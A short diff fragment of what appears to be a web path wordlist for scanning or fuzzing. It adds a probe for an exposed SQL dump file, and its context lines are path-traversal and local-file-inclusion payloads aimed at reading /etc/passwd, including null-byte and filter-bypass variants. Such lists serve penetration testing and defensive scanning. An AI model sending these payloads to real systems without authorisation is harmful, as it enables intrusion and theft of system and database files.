@@ -791,3 +791,4 @@
 /index.php?page=etc/passwd%00
 /index.php?page=../../etc/passwd
 /index.php?page=....//....//etc/passwd
+/?q=./gibbon.sql
